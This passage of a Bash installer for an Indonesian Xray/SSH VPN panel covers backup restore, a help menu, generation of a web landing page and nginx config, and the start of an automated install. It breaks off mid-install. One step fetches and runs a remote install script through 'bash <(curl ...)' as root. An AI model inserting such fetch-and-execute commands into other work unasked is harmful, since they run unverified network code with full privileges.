    # Sort by newest first
    IFS=$'\n' backups=($(ls -t "${backups[@]}" 2>/dev/null)); unset IFS
    [[ ${#backups[@]} -eq 0 ]] && { echo -e "  ${RED}No backups found!${NC}"; sleep 2; return; }
    local i=1
    for backup in "${backups[@]}"; do
        printf "  ${CYAN}[%d]${NC} %-40s ${YELLOW}%s${NC}\n" "$i" "$(basename "$backup")" "$(du -h "$backup" | awk '{print $1}')"
        ((i++))
    done
    echo ""; read -p "  Select [1-${#backups[@]}] or 0 to cancel: " choice
    # Fix: kondisi ambigu - pakai if eksplisit
    if [[ "$choice" == "0" ]] || [[ ! "$choice" =~ ^[0-9]+$ ]]; then
        echo -e "  ${YELLOW}Cancelled${NC}"; sleep 1; return
    fi
    local selected="${backups[$((choice-1))]}"
    [[ -z "$selected" ]] && { echo -e "  ${RED}Pilihan tidak valid!${NC}"; sleep 1; return; }
    read -p "  Continue? [y/N]: " confirm
    [[ "$confirm" != "y" ]] && { echo -e "  ${YELLOW}Cancelled${NC}"; sleep 1; return; }
    tar -xzf "$selected" -C / 2>/dev/null && \
        echo -e "  ${GREEN}✔ Restore successful!${NC}" || \
        echo -e "  ${RED}✘ Restore failed!${NC}"
    systemctl restart xray nginx haproxy 2>/dev/null
    echo ""; read -p "  Tekan Enter untuk kembali..."
}

_show_help() {
    clear; print_menu_header "COMMAND GUIDE"
    echo -e "  ${CYAN}[1-4]${NC}  → Kelola akun SSH/VMess/VLess/Trojan"
    echo -e "  ${CYAN}[5]${NC}    → Generate trial Xray (1 jam)"
    echo -e "  ${CYAN}[6]${NC}    → List semua akun"
    echo -e "  ${CYAN}[7-8]${NC}  → Cek / hapus akun expired"
    echo -e "  ${CYAN}[9]${NC}    → Telegram bot management (VPN-Bot)"
    echo -e "  ${CYAN}[10]${NC}   → Ganti domain"
    echo -e "  ${CYAN}[11]${NC}   → Fix/renew SSL certificate"
    echo -e "  ${CYAN}[12]${NC}   → Optimize VPS settings"
    echo -e "  ${CYAN}[13]${NC}   → Restart semua service"
    echo -e "  ${CYAN}[14]${NC}   → Lihat info port"
    echo -e "  ${CYAN}[15]${NC}   → Speedtest Ookla"
    echo -e "  ${CYAN}[16]${NC}   → Update script dari GitHub"
    echo -e "  ${CYAN}[17-18]${NC}→ Backup & restore"
    echo -e "  ${CYAN}[19]${NC}   → Menu uninstall"
    echo -e "  ${CYAN}[20]${NC}   → Advanced settings"
    echo -e "  ${CYAN}[0]${NC}    → Exit"
    echo ""; read -p "  Press any key to back..."
}

#================================================
# AUTO INSTALL
#================================================

#================================================
# DEPLOY WEB PAGE (dipanggil saat install & update)
#================================================

deploy_web_page() {
    mkdir -p "$PUBLIC_HTML"
    # Hapus semua file default nginx SEBELUM tulis index.html
    rm -f "$PUBLIC_HTML/index.nginx-debian.html" \
          "$PUBLIC_HTML/50x.html" \
          "$PUBLIC_HTML/index.htm" 2>/dev/null || true
    # Tulis robots.txt agar mesin pencari bisa index
    cat > "$PUBLIC_HTML/robots.txt" << 'ROBOTEOF'
User-agent: *
Allow: /
Disallow: /akun/
Sitemap: SITEMAP_PLACEHOLDER
ROBOTEOF
    # Ganti placeholder sitemap dengan domain asli
    if [[ -n "$DOMAIN" ]]; then
        sed -i "s|SITEMAP_PLACEHOLDER|https://${DOMAIN}/sitemap.xml|" "$PUBLIC_HTML/robots.txt"
    else
        sed -i "s|SITEMAP_PLACEHOLDER|/sitemap.xml|" "$PUBLIC_HTML/robots.txt"
    fi

    # Tulis sitemap.xml
    # Gunakan https:// jika sudah ada SSL cert, http:// jika belum
    local _proto="http"
    if [[ -n "$DOMAIN" ]] && \
       { [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]] || \
         [[ -f "/etc/xray/xray.crt" ]]; }; then
        _proto="https"
    fi
    local SITE_URL="${_proto}://${DOMAIN:-$(get_ip 2>/dev/null || hostname -I | awk '{print $1}')}"
    cat > "$PUBLIC_HTML/sitemap.xml" << SITEMAPEOF
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url>
    <loc>${SITE_URL}/</loc>
    <changefreq>weekly</changefreq>
    <priority>1.0</priority>
  </url>
</urlset>
SITEMAPEOF

    # Judul dan deskripsi halaman pakai domain
    local PAGE_TITLE="${DOMAIN:-VPN Server}"
    local _domain_suffix=""
    [[ -n "$DOMAIN" ]] && _domain_suffix=" | ${DOMAIN}"
    local PAGE_DESC="Panel VPN Premium berbasis Xray-core. Protokol VMess, VLess, Trojan, SSH dengan WebSocket dan gRPC. TLS 1.3, uptime 24/7${_domain_suffix}."

    cat > "$PUBLIC_HTML/index.html" << WEBEOF
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${PAGE_TITLE} — VPN Panel</title>
<meta name="description" content="${PAGE_DESC}">
<meta name="robots" content="index, follow">
<link rel="canonical" href="${SITE_URL}/">
<!-- Open Graph / sosial media preview -->
<meta property="og:type" content="website">
<meta property="og:url" content="${SITE_URL}/">
<meta property="og:title" content="${PAGE_TITLE} — VPN Panel">
<meta property="og:description" content="${PAGE_DESC}">
<!-- Schema.org structured data -->
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebSite","name":"${PAGE_TITLE}","url":"${SITE_URL}/","description":"${PAGE_DESC}"}
</script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=JetBrains+Mono:wght@400;600&display=swap');
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{
  --c1:#0ea5e9;--c2:#38bdf8;--c3:#22d3ee;--c4:#10b981;--c5:#f59e0b;--c6:#8b5cf6;
  --bg:#060d1a;--bg2:#0a1628;--bg3:#0f2040;--border:rgba(14,165,233,.15);
  --text:#e0f2fe;--muted:#5b7fa6;
}
html{scroll-behavior:smooth}
body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh;overflow-x:hidden}
.wrap{max-width:900px;margin:0 auto;padding:0 20px 80px}

/* HERO */
.hero{text-align:center;padding:72px 20px 52px}
.site-name{font-size:clamp(2rem,6vw,3.2rem);font-weight:900;letter-spacing:2px;
  background:linear-gradient(135deg,#fff 20%,var(--c1),var(--c2));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  line-height:1.1;margin-bottom:14px}
.site-sub{font-family:'JetBrains Mono',monospace;font-size:.8rem;letter-spacing:6px;
  color:var(--c2);text-transform:uppercase;opacity:.7;margin-bottom:18px}
.badge-online{display:inline-flex;align-items:center;gap:8px;
  background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.25);
  border-radius:30px;padding:6px 18px;font-size:.75rem;color:#6ee7b7;letter-spacing:1px}
.dot-green{width:8px;height:8px;border-radius:50%;background:#10b981;
  box-shadow:0 0 8px #10b981;animation:pulse 1.8s ease-in-out infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.5)}}

/* TICKER */
.ticker-outer{overflow:hidden;background:rgba(14,165,233,.03);
  border-top:1px solid var(--border);border-bottom:1px solid var(--border);
  padding:10px 0;margin:28px 0 36px}
.ticker-inner{display:flex;animation:tick 36s linear infinite;white-space:nowrap}
.ticker-inner:hover{animation-play-state:paused}
.tick-item{font-family:'JetBrains Mono',monospace;font-size:.75rem;
  color:var(--muted);padding:0 48px;flex-shrink:0}
.tick-item b{color:var(--c1)}
@keyframes tick{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}

/* SECTION LABEL */
.sec-label{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:var(--c1);
  letter-spacing:4px;text-transform:uppercase;margin:28px 0 12px;
  display:flex;align-items:center;gap:10px}
.sec-label::after{content:'';flex:1;height:1px;
  background:linear-gradient(90deg,rgba(14,165,233,.4),transparent)}

/* PROTOCOL CARDS */
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(185px,1fr));gap:12px;margin-bottom:12px}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:14px;
  padding:18px 16px;position:relative;overflow:hidden;transition:all .3s}
.card::before{content:'';position:absolute;top:0;left:-100%;
  width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--c1),transparent);
  animation:scan 5s linear infinite}
@keyframes scan{0%{left:-100%}100%{left:100%}}
.card:hover{border-color:rgba(14,165,233,.4);transform:translateY(-4px);
  box-shadow:0 8px 28px rgba(14,165,233,.1)}
.card-label{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--c1);
  letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
.card-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;line-height:1.8;color:#c0d8f0}
.hi{color:var(--c4)}.lo{color:var(--muted);font-size:.75rem}

/* SERVICE STATUS */
.svc-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:8px;margin-bottom:12px}
.svc{background:var(--bg2);border:1px solid var(--border);border-radius:10px;
  padding:10px 14px;display:flex;align-items:center;gap:9px;
  font-family:'JetBrains Mono',monospace;font-size:.77rem}
.dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.dot.on{background:var(--c4);box-shadow:0 0 7px var(--c4);animation:pulse 2s ease-in-out infinite}
.dot.off{background:#ef4444;box-shadow:0 0 5px #ef444466}

/* INFOBOX */
.infobox{background:var(--bg2);border:1px solid var(--border);border-radius:14px;
  padding:20px;margin-bottom:12px}
.infobox p{font-size:.83rem;color:#8aaccc;line-height:1.9}
.infobox strong{color:var(--c2)}

/* WARN BOXES */
.warn{border-radius:14px;padding:18px 20px;margin-bottom:12px;position:relative}
.warn.red{background:rgba(239,68,68,.04);border:1px solid rgba(239,68,68,.25)}
.warn.yellow{background:rgba(245,158,11,.04);border:1px solid rgba(245,158,11,.2)}
.warn.blue{background:rgba(14,165,233,.04);border:1px solid rgba(14,165,233,.2)}
.warn-title{font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:3px;
  text-transform:uppercase;margin-bottom:12px;font-weight:700}
.warn.red .warn-title{color:#f87171}
.warn.yellow .warn-title{color:var(--c5)}
.warn.blue .warn-title{color:var(--c1)}
.warn ul{list-style:none}
.warn li{font-size:.81rem;color:#9ab4cc;padding:5px 0 5px 24px;
  position:relative;line-height:1.7;border-bottom:1px solid rgba(255,255,255,.04)}
.warn li:last-child{border-bottom:none}
.warn.red li::before{content:'—';position:absolute;left:0;color:#f87171}
.warn.yellow li::before{content:'—';position:absolute;left:0;color:var(--c5)}
.warn.blue li::before{content:'—';position:absolute;left:0;color:var(--c1)}

/* CONTACT BOX */
.contact{background:linear-gradient(135deg,rgba(14,165,233,.05),rgba(139,92,246,.05));
  border:1px solid rgba(14,165,233,.2);border-radius:16px;
  padding:26px 22px;margin-bottom:12px;text-align:center;position:relative}
.contact-title{font-family:'JetBrains Mono',monospace;font-size:.75rem;
  color:var(--c1);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px}
.contact-desc{font-size:.83rem;color:#6b8aaa;line-height:1.9;margin-bottom:18px}
.tg-btn{display:inline-flex;align-items:center;gap:9px;
  background:linear-gradient(135deg,#0088cc,#0055aa);
  color:#fff;padding:12px 34px;border-radius:40px;
  font-family:'JetBrains Mono',monospace;font-size:.75rem;letter-spacing:2px;
  text-decoration:none;box-shadow:0 4px 22px rgba(0,136,204,.35);transition:all .3s}
.tg-btn:hover{transform:translateY(-3px);box-shadow:0 10px 36px rgba(0,136,204,.5)}
.tg-handle{font-family:'JetBrains Mono',monospace;font-size:.82rem;
  color:var(--c1);margin-top:12px;letter-spacing:3px}

/* DIVIDER */
.div{height:1px;background:linear-gradient(90deg,transparent,var(--c1),transparent);
  margin:28px 0;opacity:.3}

/* FOOTER */
footer{text-align:center;padding:26px 0 10px;
  font-family:'JetBrains Mono',monospace;font-size:.65rem;color:#1c3050;letter-spacing:1px}
footer strong{color:#2a4565}
#clkLine{color:#1a2840;margin-top:4px}

@media(max-width:500px){
  .site-name{font-size:1.75rem;letter-spacing:1px}
  .cards{grid-template-columns:1fr 1fr}
  .svc-grid{grid-template-columns:1fr 1fr}
}
</style>
</head>
<body>
<div class="wrap">

<div class="hero">
  <div class="site-name">${PAGE_TITLE}</div>
  <div class="site-sub">Tunnel &nbsp;&middot;&nbsp; Secure VPN Panel</div>
  <div class="badge-online">
    <span class="dot-green"></span>
    <span>Server Online &nbsp;&mdash;&nbsp; Uptime 24/7</span>
  </div>
</div>

<div class="ticker-outer">
  <div class="ticker-inner">
    <span class="tick-item"><b>VPN Premium</b> &nbsp;&mdash;&nbsp; VMess &middot; VLess &middot; Trojan &middot; SSH</span>
    <span class="tick-item">TLS <b>443</b> &nbsp;|&nbsp; No-TLS <b>80</b></span>
    <span class="tick-item">Transport: <b>WebSocket</b> &amp; <b>gRPC</b></span>
    <span class="tick-item">HAProxy &middot; Nginx &middot; Dropbear</span>
    <span class="tick-item">Let's Encrypt TLS <b>1.3</b></span>
    <span class="tick-item">Ubuntu <b>20.04</b> / <b>22.04</b> LTS</span>
    <span class="tick-item"><b>VPN Premium</b> &nbsp;&mdash;&nbsp; VMess &middot; VLess &middot; Trojan &middot; SSH</span>
    <span class="tick-item">TLS <b>443</b> &nbsp;|&nbsp; No-TLS <b>80</b></span>
    <span class="tick-item">Transport: <b>WebSocket</b> &amp; <b>gRPC</b></span>
    <span class="tick-item">HAProxy &middot; Nginx &middot; Dropbear</span>
    <span class="tick-item">Let's Encrypt TLS <b>1.3</b></span>
    <span class="tick-item">Ubuntu <b>20.04</b> / <b>22.04</b> LTS</span>
  </div>
</div>

<div class="sec-label">Protocol &amp; Port</div>
<div class="cards">
  <div class="card">
    <div class="card-label">Protocol</div>
    <div class="card-val"><span class="hi">VMess</span> &middot; <span class="hi">VLess</span> &middot; <span class="hi">Trojan</span><br><span class="lo">SSH &middot; Dropbear</span></div>
  </div>
  <div class="card">
    <div class="card-label">Transport</div>
    <div class="card-val"><span class="hi">WebSocket</span> (WS)<br><span class="hi">gRPC</span> Stream</div>
  </div>
  <div class="card">
    <div class="card-label">TLS / SSL</div>
    <div class="card-val">TLS <span class="hi">1.2</span> / <span class="hi">1.3</span><br><span class="lo">Let's Encrypt</span></div>
  </div>
  <div class="card">
    <div class="card-label">Port Config</div>
    <div class="card-val">TLS: <span class="hi">443</span> &nbsp;|&nbsp; HTTP: <span class="hi">80</span><br>SSH: <span class="hi">22</span>/<span class="hi">222</span> &nbsp;UDP: <span class="hi">7100+</span></div>
  </div>
</div>

<div class="sec-label">Network Services</div>
<div class="svc-grid" id="svcGrid">
  <div class="svc"><div class="dot" id="dot-xray"></div><span id="lbl-xray">XRAY</span></div>
  <div class="svc"><div class="dot" id="dot-nginx"></div><span id="lbl-nginx">NGINX</span></div>
  <div class="svc"><div class="dot" id="dot-haproxy"></div><span id="lbl-haproxy">HAPROXY</span></div>
  <div class="svc"><div class="dot" id="dot-dropbear"></div><span id="lbl-dropbear">DROPBEAR</span></div>
  <div class="svc"><div class="dot" id="dot-ssh"></div><span id="lbl-ssh">SSH</span></div>
  <div class="svc"><div class="dot" id="dot-udp"></div><span id="lbl-udp">UDP CUSTOM</span></div>
</div>

<div class="div"></div>

<div class="sec-label">Tentang Panel</div>
<div class="infobox">
  <p>
    <strong>${PAGE_TITLE}</strong> adalah panel VPN premium berbasis <strong>Xray-core</strong>
    yang mendukung <strong>VMess, VLess, dan Trojan</strong> dengan transport <strong>WebSocket &amp; gRPC</strong>.
    Dilengkapi <strong>HAProxy</strong> multi-port TLS, <strong>Nginx</strong> reverse proxy,
    SSH, Dropbear, dan UDP Custom. Dioptimalkan untuk <strong>Ubuntu 20.04 / 22.04 LTS</strong>.
  </p>
</div>

<div class="sec-label">Peringatan &amp; Ketentuan</div>
<div class="warn red">
  <div class="warn-title">Dilarang Keras</div>
  <ul>
    <li>Menjual, mendistribusikan, atau menyebarkan script ini tanpa izin resmi.</li>
    <li>Menghapus, mengganti, atau memodifikasi signature dan kredit dalam script.</li>
    <li>Mengklaim script ini sebagai karya sendiri tanpa izin.</li>
    <li>Menggunakan panel ini untuk aktivitas ilegal atau yang merugikan pihak lain.</li>
    <li>Membobol, meretas, atau menyalahgunakan infrastruktur server orang lain.</li>
  </ul>
</div>

<div class="warn yellow">
  <div class="warn-title">Penting &mdash; Baca Sebelum Menggunakan</div>
  <ul>
    <li>Panel ini hanya untuk penggunaan pribadi yang sah dan tidak melanggar hukum setempat.</li>
    <li>Pengguna bertanggung jawab penuh atas segala aktivitas yang dilakukan melalui panel ini.</li>
    <li>Admin berhak menonaktifkan akun yang melanggar ketentuan tanpa pemberitahuan sebelumnya.</li>
  </ul>
</div>

<div class="warn blue">
  <div class="warn-title">Informasi Penggunaan</div>
  <ul>
    <li>Akun VPN bersifat sementara sesuai masa aktif yang telah ditentukan saat pembuatan.</li>
    <li>Pastikan aplikasi client (v2rayNG, Clash, HTTP Custom) sudah terinstall dan dikonfigurasi dengan benar.</li>
    <li>Untuk hasil terbaik, gunakan koneksi WiFi atau data seluler yang stabil.</li>
    <li>Jangan share akun ke orang lain &mdash; setiap akun hanya untuk 1 pengguna.</li>
  </ul>
</div>

<div class="div"></div>

<div class="contact">
  <div class="contact-title">Ada Kendala?</div>
  <div class="contact-desc">
    Jika mengalami masalah instalasi, akun tidak bisa konek,<br>
    error konfigurasi, atau pertanyaan teknis lainnya &mdash;<br>
    <strong>segera hubungi admin kami di Telegram.</strong>
  </div>
  <a href="https://t.me/YouzinCrabz" class="tg-btn" target="_blank">
    Hubungi @YouzinCrabz
  </a>
  <div class="tg-handle">t.me/YouzinCrabz</div>
</div>

</div>

<footer>
  <p>&copy; 2024&ndash;2025 <strong>${PAGE_TITLE}</strong> &nbsp;&middot;&nbsp; All rights reserved</p>
  <p id="clkLine">[ &nbsp; ] Powered by Xray-core &amp; Nginx</p>
</footer>

<script>
/* Service status check via fetch */
(function(){
  const svcs={
    'xray':['dot-xray','lbl-xray'],
    'nginx':['dot-nginx','lbl-nginx'],
    'haproxy':['dot-haproxy','lbl-haproxy'],
    'dropbear':['dot-dropbear','lbl-dropbear'],
    'sshd':['dot-ssh','lbl-ssh'],
    'udp-custom':['dot-udp','lbl-udp']
  };
  // Try to fetch /status.json if exists (optional), else show static
  fetch('/status.json',{cache:'no-cache'})
    .then(r=>{if(!r.ok)throw 0;return r.json();})
    .then(d=>{
      Object.keys(svcs).forEach(k=>{
        const [dotId]=svcs[k];
        const el=document.getElementById(dotId);
        if(el){el.className='dot '+(d[k]==='active'?'on':'off');}
      });
    })
    .catch(()=>{
      // Tidak ada status.json — semua tampilkan ON (asumsi berjalan)
      Object.values(svcs).forEach(([dotId])=>{
        const el=document.getElementById(dotId);
        if(el) el.className='dot on';
      });
    });
})();

/* Clock */
setInterval(()=>{
  document.getElementById('clkLine').textContent='[ '+new Date().toLocaleTimeString('id-ID',{hour12:false})+' ] Powered by Xray-core & Nginx';
},1000);
</script>
</body>
</html>
WEBEOF

    # ── Hapus semua file default nginx ──
    rm -f /var/www/html/index.nginx-debian.html \
          /var/www/html/50x.html \
          /var/www/html/index.htm 2>/dev/null || true

    # ── Permission ──
    chown -R www-data:www-data /var/www/html/ 2>/dev/null || \
        chown -R root:root /var/www/html/ 2>/dev/null || true
    chmod 644 /var/www/html/index.html 2>/dev/null || true

    # ── Buat status.json agar halaman web bisa cek layanan secara live ──
    _generate_status_json() {
        local out="$PUBLIC_HTML/status.json"
        local xray_s nginx_s haproxy_s dropbear_s ssh_s udp_s
        xray_s=$(systemctl is-active xray 2>/dev/null)
        nginx_s=$(systemctl is-active nginx 2>/dev/null)
        haproxy_s=$(systemctl is-active haproxy 2>/dev/null)
        dropbear_s=$(systemctl is-active dropbear 2>/dev/null)
        ssh_s=$(systemctl is-active ssh 2>/dev/null || systemctl is-active sshd 2>/dev/null)
        udp_s=$(systemctl is-active udp-custom 2>/dev/null)
        printf '{"xray":"%s","nginx":"%s","haproxy":"%s","dropbear":"%s","sshd":"%s","udp-custom":"%s"}\n' \
            "$xray_s" "$nginx_s" "$haproxy_s" "$dropbear_s" "$ssh_s" "$udp_s" > "$out" 2>/dev/null
        chmod 644 "$out" 2>/dev/null || true
    }
    _generate_status_json

    # ── Permission untuk semua file web ──
    chown www-data:www-data "$PUBLIC_HTML/robots.txt" "$PUBLIC_HTML/sitemap.xml" 2>/dev/null || true
    chmod 644 "$PUBLIC_HTML/robots.txt" "$PUBLIC_HTML/sitemap.xml" 2>/dev/null || true

    # ── Pasang cron generate status.json setiap 2 menit ──
    local cron_status="*/2 * * * * bash /root/tunnel.sh _gen_status 2>/dev/null"
    crontab -l 2>/dev/null | grep -q "_gen_status" || \
        (crontab -l 2>/dev/null; echo "$cron_status") | crontab - 2>/dev/null

    # ── Fix nginx config agar port 80 serve /var/www/html ──
    local nginx_cfg=/etc/nginx/sites-available/default
    local nginx_en=/etc/nginx/sites-enabled/default
    local need_rewrite=0

    if [[ ! -f "$nginx_cfg" ]]; then
        need_rewrite=1
    # Hanya rewrite kalau BENAR-BENAR masih default nginx bawaan
    # (tidak ada root /var/www/html DAN tidak ada proxy_pass VPN)
    elif ! grep -q "root /var/www/html" "$nginx_cfg" 2>/dev/null && \
         ! grep -q "proxy_pass.*812[0-9]\|proxy_pass.*808[0-9]\|grpc_pass" "$nginx_cfg" 2>/dev/null; then
        need_rewrite=1
    fi

    if [[ "$need_rewrite" -eq 1 ]]; then
        # Config belum ada sama sekali / masih default nginx murni
        # Tulis config minimal port 80 saja (tanpa ganggu config VPN)
        cat > "$nginx_cfg" << 'NGXEOF'
# ── Port 80: Web page + WS NoTLS ──
server {
    listen 80 default_server;
    server_name _;
    root /var/www/html;
    index index.html;
    access_log off;

    location = /vmess {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location = /vless {
        proxy_pass http://127.0.0.1:8081;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location = /trojan {
        proxy_pass http://127.0.0.1:8082;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
    location / {
        try_files $uri $uri/ /index.html;
    }
}
NGXEOF
        echo -e "  ${GREEN}✔${NC} Nginx config port 80 dibuat"
    elif grep -q "root /var/www/html" "$nginx_cfg" 2>/dev/null; then
        # Config VPN sudah benar, tidak perlu apa-apa
        echo -e "  ${GREEN}✔${NC} Nginx config sudah benar, skip rewrite"
    else
        # Ada config VPN tapi belum ada root — tambahkan root ke block port 80
        if ! grep -q "root /var/www/html" "$nginx_cfg" 2>/dev/null; then
            sed -i '/listen 80/a\    root /var/www/html;\n    index index.html;' \
                "$nginx_cfg" 2>/dev/null || true
            echo -e "  ${GREEN}✔${NC} Nginx root ditambahkan ke config port 80"
        fi
    fi

    # Pastikan symlink sites-enabled ada
    mkdir -p /etc/nginx/sites-enabled
    [[ ! -L "$nginx_en" ]] && ln -sf "$nginx_cfg" "$nginx_en" 2>/dev/null || true
    rm -f /etc/nginx/conf.d/default.conf 2>/dev/null || true

    # ── Reload nginx ──
    if nginx -t >/dev/null 2>&1; then
        systemctl reload nginx >/dev/null 2>&1 || systemctl restart nginx >/dev/null 2>&1 || true
        echo -e "  ${GREEN}✔${NC} Nginx reload OK"
    else
        echo -e "  ${RED}✘${NC} Nginx config error — jalankan: nginx -t"
    fi

    [[ -f /var/www/html/index.html ]] \
        && echo -e "  ${GREEN}✔${NC} Web page OK → http://${DOMAIN:-$(get_ip)}/" \
        || echo -e "  ${RED}✘${NC} Gagal menulis index.html!"
}

auto_install() {
    show_install_banner
    setup_domain
    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain kosong!${NC}"; exit 1; }

    local domain_type="custom"
    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")

    clear; show_install_banner
    echo -e "  ${WHITE}Domain   :${NC} ${GREEN}${DOMAIN}${NC}"
    echo -e "  ${WHITE}SSL Type :${NC} ${GREEN}$([[ "$domain_type" == "custom" ]] && echo "Let's Encrypt" || echo "Self-Signed")${NC}"
    echo ""

    animated_loading "Mempersiapkan instalasi" 2
    echo ""

    local total=10 step=0 LOG="/tmp/install.log"
    > "$LOG"

    _ok()   { printf "  ${GREEN}✔${NC}  %-45s\n" "$1"; }
    _fail() { printf "  ${RED}✘${NC}  %-45s\n" "$1"; }

    _head() {
        echo ""
        printf "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        printf "  ${YELLOW}  STEP %d/%d${NC}  ${WHITE}%s${NC}\n" "$2" "$3" "$1"
        printf "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
        echo ""
    }

    _pkg() {
        local pkg="$1" sp=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') i=0
        DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >> "$LOG" 2>&1 &
        local pid=$!
        while kill -0 $pid 2>/dev/null; do
            printf "\r  ${CYAN}${sp[$((i % 10))]}${NC}  Installing %-30s" "${pkg}..."
            sleep 0.08; ((i++))
        done
        wait $pid
        [[ $? -eq 0 ]] && printf "\r  ${GREEN}✔${NC}  %-40s\n" "$pkg" || printf "\r  ${RED}✘${NC}  %-40s\n" "$pkg (gagal)"
    }

    _run() {
        local label="$1" cmd="$2" sp=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏') i=0
        eval "$cmd" >> "$LOG" 2>&1 &
        local pid=$!
        while kill -0 $pid 2>/dev/null; do
            printf "\r  ${CYAN}${sp[$((i % 10))]}${NC}  %-45s" "${label}..."
            sleep 0.08; ((i++))
        done
        wait $pid
        local ret=$?
        [[ $ret -eq 0 ]] && printf "\r  ${GREEN}✔${NC}  %-45s\n" "$label" || printf "\r  ${RED}✘${NC}  %-45s\n" "$label (gagal)"
        return $ret
    }

    # ── TIMEZONE: Tanya user sesuai wilayah ──
    echo ""
    local W_tz; W_tz=$(get_width)
    _box_top $W_tz
    _box_center $W_tz "${YELLOW}${BOLD}PILIH TIMEZONE${NC}"
    _box_divider $W_tz
    echo -e "  Pilih timezone sesuai wilayah Anda:\n"
    echo -e "  ${CYAN}[1]${NC} WIB  — Asia/Jakarta   (UTC+7) — Jawa, Sumatra, Kal-Bar"
    echo -e "  ${CYAN}[2]${NC} WITA — Asia/Makassar  (UTC+8) — Kalimantan, Bali, Sulawesi"
    echo -e "  ${CYAN}[3]${NC} WIT  — Asia/Jayapura  (UTC+9) — Maluku, Papua"
    echo -e "  ${CYAN}[4]${NC} SGT  — Asia/Singapore (UTC+8) — Singapore"
    echo -e "  ${CYAN}[5]${NC} Lainnya (ketik manual)"
    _box_bottom $W_tz
    echo ""
    local tz_choice tz_zone=""
    while true; do
        read -p "  Pilih timezone [1-5]: " tz_choice
        case $tz_choice in
            1) tz_zone="Asia/Jakarta"   ;;
            2) tz_zone="Asia/Makassar"  ;;
            3) tz_zone="Asia/Jayapura"  ;;
            4) tz_zone="Asia/Singapore" ;;
            5) read -p "  Ketik timezone: " tz_zone ;;
            *) echo -e "  ${RED}Pilih 1-5!${NC}"; continue ;;
        esac
        [[ -n "$tz_zone" ]] && break
    done
    if timedatectl set-timezone "$tz_zone" 2>/dev/null; then
        _ok "Timezone: ${tz_zone}"
    else
        timedatectl set-timezone Asia/Jakarta 2>/dev/null || true
        _ok "Timezone fallback: Asia/Jakarta (WIB)"
    fi
    # NTP sync — chrony untuk akurasi jam terbaik
    timedatectl set-ntp true 2>/dev/null || true
    command -v chronyc >/dev/null 2>&1 || apt-get install -y chrony >/dev/null 2>&1 || true
    systemctl enable chrony 2>/dev/null; systemctl restart chrony 2>/dev/null || true
    hwclock --systohc 2>/dev/null || true
    _ok "Waktu server: $(date '+%d %b %Y %H:%M:%S %Z')"

    ((step++)); show_progress $step $total "System Update"
    _head "System Update" $step $total
    _wait_apt_lock
    # Stop unattended-upgrades agar apt tidak locked
    systemctl stop unattended-upgrades 2>/dev/null || true
    _run "apt-get update" "apt-get update -y"
    _run "apt-get upgrade" "DEBIAN_FRONTEND=noninteractive apt-get upgrade -y -o Dpkg::Options::='--force-confdef' -o Dpkg::Options::='--force-confold'"

    ((step++)); show_progress $step $total "Installing Base Packages"
    _head "Base Packages" $step $total
    for pkg in curl wget unzip uuid-runtime net-tools openssl jq python3 python3-pip software-properties-common ca-certificates gnupg lsb-release qrencode netcat-openbsd; do _pkg "$pkg"; done

    ((step++)); show_progress $step $total "Installing VPN Services"
    _head "VPN Services" $step $total
    detect_ubuntu_version
    for pkg in nginx openssh-server dropbear haproxy; do _pkg "$pkg"; done
    # certbot diinstall terpisah via install_certbot_compat

    ((step++)); show_progress $step $total "Installing Xray-Core"
    _head "Xray Core" $step $total
    # Coba install Xray dengan retry
    local xray_installed=0
    for attempt in 1 2 3; do
        if bash <(curl -Ls --max-time 60 --retry 3 https://github.com/XTLS/Xray-install/raw/main/install-release.sh) @ v1.8.24 >> "$LOG" 2>&1; then
            xray_installed=1; break
        fi
